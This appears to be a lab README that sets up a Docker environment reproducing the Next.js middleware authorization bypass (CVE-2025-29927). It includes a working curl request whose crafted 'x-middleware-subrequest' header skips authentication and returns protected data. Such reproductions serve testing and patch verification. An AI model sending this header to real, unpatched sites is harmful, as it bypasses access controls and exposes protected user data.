# Next.js Middleware Authorization Bypass Vulnerability (CVE-2025-29927) 

Next.js is a web application framework based on React. It provides features like server-side rendering, static site generation, routing system, and API routes. When Next.js is configured to use middleware for authentication, attackers can exploit a vulnerability to bypass authentication.

## Starting the Environment

Execute the following command, then visit `http://ip:3000`:

```
docker compose up --build
```

### Manual Setup

Run the following command:

```bash
npm install
```

Start the application:

```bash
npm run build
npm start
```

Visit http://ip:3000

## Reproducing the Vulnerability

Directly accessing the protected API:
```
curl -i http://localhost:3000/api/protected/data
HTTP/1.1 307 Temporary Redirect
location: /unauthorized
Date: Sat, 22 Mar 2025 19:39:36 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Transfer-Encoding: chunked

/unauthorized#
```

Run the following command to reproduce the vulnerability:
```
curl -i -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" http://localhost:3000/api/protected/data
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
ETag: "8s59pt2il13l"
Content-Length: 175
Vary: Accept-Encoding
Date: Sat, 22 Mar 2025 19:41:09 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"message":"Successfully retrieved sensitive data","sensitiveData":"This is some sensitive data that should be protected","userId":12345,"adminAccess":true,"timestamp":"2025-03-22T19:41:09.957Z"}
